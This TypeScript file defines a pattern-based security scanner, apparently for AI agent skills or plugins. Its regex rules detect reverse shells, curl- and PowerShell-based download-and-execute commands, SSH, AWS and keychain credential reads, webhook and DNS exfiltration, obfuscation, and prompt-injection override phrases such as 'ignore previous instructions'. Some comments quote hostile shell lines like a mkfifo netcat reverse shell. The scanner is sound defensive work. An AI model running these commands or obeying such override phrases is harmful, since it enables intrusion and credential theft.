export interface PatternMatch {
  pattern: string;
  category: string;
  line: number;
  snippet: string;
  severity: 'critical' | 'warning' | 'info';
  description: string;
}

export interface PatternRule {
  id: string;
  pattern: RegExp;
  category: string;
  severity: 'critical' | 'warning' | 'info';
  description: string;
}

// Ported from openclaw-security-monitor, Sclawhub rules, and B@dskills payloads
export const SECURITY_PATTERNS: PatternRule[] = [
  // Reverse shells (from B@dskills + openclaw-security-monitor)
  // `>&`, `&>` and `>` all send the interactive shell's output to the socket
  { id: 'RS-001', pattern: /\b(?:bash|sh|zsh|ksh)\s+-i\s+(?:>&|&>|>)\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash reverse shell pattern' },
  { id: 'RS-002', pattern: /\b(?:nc|ncat|netcat)\b.*(?:-e|-c|--exec|--sh-exec)\s+\S*(?:\/(?:ba|z)?sh\b|cmd)/i, category: 'reverse-shell', severity: 'critical', description: 'Netcat reverse shell' },
  { id: 'RS-003', pattern: /\bnet\.connect\s*\(.*\bchild_process\b/i, category: 'reverse-shell', severity: 'critical', description: 'Node.js net.connect reverse shell' },
  { id: 'RS-004', pattern: /\bnew\s+WebSocket\b.*\bchild_process\b/is, category: 'reverse-shell', severity: 'critical', description: 'WebSocket reverse shell' },
  // A socket wired to a shell — not any line naming both (an audit hook that blocks `socket.` and `subprocess.`)
  { id: 'RS-005', pattern: /\bsocket\.socket\s*\([^\n]{0,1000}?(?:\bos\.dup2\s*\(|\bpty\.spawn\s*\(|\bsubprocess\.\w+\s*\([^\n]{0,300}?\b(?:ba|z|k)?sh\b)|\bsocket\b[^\n]{0,1000}?\.on\s*\(\s*['"]data['"][^\n]{0,1000}?\b(?:exec|execSync|spawn|spawnSync)\s*\(/i, category: 'reverse-shell', severity: 'critical', description: 'Socket-based reverse shell' },
  { id: 'RS-006', pattern: /python\S*\s+-c\s+['"]import\s+socket/i, category: 'reverse-shell', severity: 'critical', description: 'Python reverse shell' },
  { id: 'RS-007', pattern: /\bsocat\b.*\bexec:/i, category: 'reverse-shell', severity: 'critical', description: 'Socat reverse shell' },
  // `mkfifo f; cat f | sh -i 2>&1 | nc host port > f` — netcat without -e.
  // The first mkfifo and the first `| sh` after it are taken atomically
  // (`(?=(…))\1`) from the start of a line: the earliest choices are always
  // the best, and retrying every `|` against every later one was cubic
  // (`mkfifo|e|e|…`, 100 KB: 15 s). A shell path stops at `|` (the later `|`
  // starts the same match).
  { id: 'RS-008', pattern: /(?<![^\n\r\u2028\u2029])(?=(.*?\bmkfifo\b))\1(?=(.*?\|\s*(?:[^\s|]*\/)?(?:ba|z|k)?sh\b))\2.*\|\s*(?:nc|ncat|netcat)\b/i, category: 'reverse-shell', severity: 'critical', description: 'Named-pipe netcat reverse shell' },
  // `exec 5<>/dev/tcp/host/port` — a read-write socket on a shell descriptor
  { id: 'RS-009', pattern: /\bexec\s+\d+<>\s*\/dev\/(?:tcp|udp)\//i, category: 'reverse-shell', severity: 'critical', description: 'Bash /dev/tcp socket descriptor' },

  // Curl-pipe execution
  // The shell may be run through sudo/env and named by path (`| sudo bash`,
  // `| /bin/zsh`); `\b` keeps `| shasum` out.
  { id: 'CP-001', pattern: /curl\s+[^|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+(?:[^\s=]+=\S*\s+)*)?(?:\S*\/)?(?:ba|z|k|da|fi)?sh\b/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-shell execution' },
  { id: 'CP-002', pattern: /wget\s+[^|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+(?:[^\s=]+=\S*\s+)*)?(?:\S*\/)?(?:ba|z|k|da|fi)?sh\b/i, category: 'curl-pipe', severity: 'critical', description: 'Wget-pipe-shell execution' },
  // Only when Python runs the download: its program from stdin (`| python`,
  // `| python3 - --args`, `| python3 /dev/stdin`) or `-c` code that executes
  // stdin however it is spelled (`exec(sys.stdin.read())`, `import sys as s;
  // exec(s.stdin.read())`, `exec(compile(sys.stdin.read(), …))`, `from sys
  // import stdin; exec(stdin.read())`). `| python -m json.tool` and
  // `| python -c "print(…)"` read the download as data.
  { id: 'CP-003', pattern: /(?:curl|wget)\s+[^|]*\|\s*(?:sudo\s+(?:-\S+\s+)*)?(?:env\s+(?:[^\s=]+=\S*\s+)*)?(?:\S*\/)?python[\d.]*\b(?:\s+-(?![cm]\b)[A-Za-z]+)*(?:\s*(?=$|[;&|)'"`#\n])|\s+-(?=\s|$)|\s+\/dev\/stdin\b|\s+-c\s+["'](?=[^"'\n]{0,300}\b(?:exec|eval)\s*\()(?=[^"'\n]{0,300}(?:\bstdin\b|\bopen\(\s*(?:0|["']\/dev\/stdin["']))))/i, category: 'curl-pipe', severity: 'critical', description: 'Curl-pipe-python execution' },
  // Download executed without a pipe: `bash <(curl …)`, `sh -c "$(curl …)"`,
  // `eval "$(wget -qO- …)"`, `source <(curl …)`
  { id: 'CP-004', pattern: /(?:\b(?:ba|z|k|da)?sh|\bsource|(?:^|[\s;&|])\.)\s+<\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell process substitution of a download' },
  { id: 'CP-005', pattern: /(?:\b(?:ba|z|k|da)?sh\s+-c|\beval)\s+["']?\$\(\s*(?:curl|wget)\b/i, category: 'curl-pipe', severity: 'critical', description: 'Shell command substitution of a download' },
  // PowerShell: `iwr … | iex`, `iex (irm …)`
  { id: 'CP-006', pattern: /\b(?:iwr|irm|invoke-webrequest|invoke-restmethod)\b[^|]*\|\s*(?:iex|invoke-expression)\b|\b(?:iex|invoke-expression)\s*\(?\s*(?:\(\s*)?(?:iwr|irm|invoke-webrequest|invoke-restmethod|new-object\s+net\.webclient)\b/i, category: 'curl-pipe', severity: 'critical', description: 'PowerShell download-and-execute' },

  // Credential harvesting (from B@dskills)
  { id: 'CH-001', pattern: /\/\.ssh\/(?:id_rsa|id_ed25519|authorized_keys|config)/i, category: 'credential-harvest', severity: 'critical', description: 'SSH key access' },
  { id: 'CH-002', pattern: /\/\.aws\/credentials/i, category: 'credential-harvest', severity: 'critical', description: 'AWS credentials access' },
  { id: 'CH-003', pattern: /\/\.gnupg\//i, category: 'credential-harvest', severity: 'critical', description: 'GPG key access' },
  { id: 'CH-004', pattern: /\/\.kube\/config/i, category: 'credential-harvest', severity: 'critical', description: 'Kubernetes config access' },
  { id: 'CH-005', pattern: /\/\.docker\/config\.json/i, category: 'credential-harvest', severity: 'critical', description: 'Docker config access' },
  { id: 'CH-006', pattern: /\/\.netrc/i, category: 'credential-harvest', severity: 'warning', description: '.netrc file access' },
  { id: 'CH-007', pattern: /\/\.npmrc/i, category: 'credential-harvest', severity: 'warning', description: '.npmrc file access (may contain auth tokens)' },
  // Reading the keychain — not the word (`# don't use the OS keychain`)
  { id: 'CH-008', pattern: /\bsecurity\s+(?:find-(?:generic|internet)-password|dump-keychain|export\s+-k)\b|\bSec(?:ItemCopyMatching|KeychainFind(?:Generic|Internet)Password)\b|\/Library\/Keychains\/|\blogin\.keychain(?:-db)?\b|\bchainbreaker\b/i, category: 'credential-harvest', severity: 'critical', description: 'macOS Keychain access' },

  // Exfiltration (from openclaw-security-monitor + B@dskills)
  { id: 'EX-001', pattern: /\.postMessage\s*\(.*\btransfer\b/i, category: 'exfiltration', severity: 'warning', description: 'postMessage with transfer' },
  { id: 'EX-002', pattern: /\bwebhook\b.*\b(?:send|post)\b/i, category: 'exfiltration', severity: 'warning', description: 'Webhook exfiltration pattern' },
  { id: 'EX-003', pattern: /dns[^\n]{0,500}?(?:lookup|resolve)[^\n]{0,500}?(?:encode|btoa|Buffer)/i, category: 'exfiltration', severity: 'critical', description: 'DNS exfiltration' },

  // Prompt injection indicators
  { id: 'PI-001', pattern: /ignore\s+(?:all\s+)?(?:previous|above|prior)\s+instructions/i, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — instruction override' },
  { id: 'PI-002', pattern: /you\s+are\s+now\s+(?:(?:a|an)\s+|in\s+(?:[\w-]+\s+){0,2}(?:mode|persona)\b)/i, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — role reassignment' },
  { id: 'PI-003', pattern: /system\s*:\s*you\s+(?:must|should|are)/i, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — fake system prompt' },
  // Not a markdown table cell holding only the tag (`| [System] | [Type] |` is a
  // placeholder column); text after it in the cell still counts
  // A role tag that opens injected text: followed (after an optional ':') by a
  // word, or alone on its line. Not a subscript (`data['x'][system]`), a CLI
  // option value (`--assign-identity [system]`), a sentence noun (`in [system].`)
  // or a table-cell placeholder (`| [System] |`).
  // The lookbehinds follow the `[` (tried at every position they cost a scan
  // back over each space run), and one space run before the optional ':'
  // (`[ \t]*:?[ \t]*` split a long run every way: 80 KB, 18 s).
  { id: 'PI-004', pattern: /\[(?<![\w'"\][-]\[)(?<!--[\w-]+[ \t]+\[)(?:SYSTEM|ADMIN)\][ \t]*(?::[ \t]*)?(?=[A-Za-z]|$)|<\|system\|>/im, category: 'prompt-injection', severity: 'warning', description: 'Prompt injection — delimiter escape' },

  // Crypto wallet targeting (from openclaw-security-monitor)
  { id: 'CW-001', pattern: /\b[13][a-km-zA-HJ-NP-Z1-9]{25,34}\b/, category: 'crypto-wallet', severity: 'warning', description: 'Bitcoin address pattern' },
  { id: 'CW-002', pattern: /\b0x[0-9a-fA-F]{40}\b/, category: 'crypto-wallet', severity: 'warning', description: 'Ethereum address pattern' },
  { id: 'CW-003', pattern: /\bcoinbase\b.*\b(?:api|key|secret)\b/i, category: 'crypto-wallet', severity: 'warning', description: 'Coinbase API access' },

  // Obfuscation indicators (from Sclawhub)
  { id: 'OB-001', pattern: /\bBuffer\.from\s*\([^,]+,\s*['"]base64['"]\)/i, category: 'obfuscation', severity: 'warning', description: 'Base64 decode operation' },
  { id: 'OB-002', pattern: /\batob\s*\(/i, category: 'obfuscation', severity: 'warning', description: 'atob decode' },
  { id: 'OB-003', pattern: /\\x[0-9a-fA-F]{2}(?:\\x[0-9a-fA-F]{2}){5,}/i, category: 'obfuscation', severity: 'warning', description: 'Hex-encoded string (6+ bytes)' },
  { id: 'OB-004', pattern: /\\u[0-9a-fA-F]{4}(?:\\u[0-9a-fA-F]{4}){5,}/i, category: 'obfuscation', severity: 'warning', description: 'Unicode-encoded string (6+ chars)' },

  // Code execution (from Sclawhub)
  { id: 'CE-001', pattern: /\beval\s*\(/i, category: 'code-exec', severity: 'critical', description: 'eval() usage' },
  { id: 'CE-002', pattern: /\bnew\s+Function\s*\(/i, category: 'code-exec', severity: 'critical', description: 'new Function() constructor' },
  { id: 'CE-003', pattern: /child_process.*\b(?:exec|execSync|spawn|spawnSync)\b/i, category: 'code-exec', severity: 'critical', description: 'child_process execution' },
  { id: 'CE-004', pattern: /\brequire\s*\(\s*['"]child_process['"]\s*\)/i, category: 'code-exec', severity: 'critical', description: 'child_process require' },
];

export function scanWithPatterns(code: string, rules?: PatternRule[]): PatternMatch[] {
  const patterns = rules ?? SECURITY_PATTERNS;
  const matches: PatternMatch[] = [];
  const lines = code.split('\n');

  for (let i = 0; i < lines.length; i++) {
    const line = lines[i];
    // Skip JS/TS line comments and JSDoc continuation lines. Markdown
    // headings (#) are intentionally not skipped — SKL-007 and CC-011 scan
    // .md content where # carries meaning.
    const trimmed = line.trimStart();
    if (trimmed.startsWith('//') || trimmed.startsWith('*')) continue;

    for (const rule of patterns) {
      if (rule.pattern.test(line)) {
        matches.push({
          pattern: rule.id,
          category: rule.category,
          line: i + 1,
          snippet: line.trim().slice(0, 120),
          severity: rule.severity,
          description: rule.description,
        });
      }
    }
  }

  return matches;
}
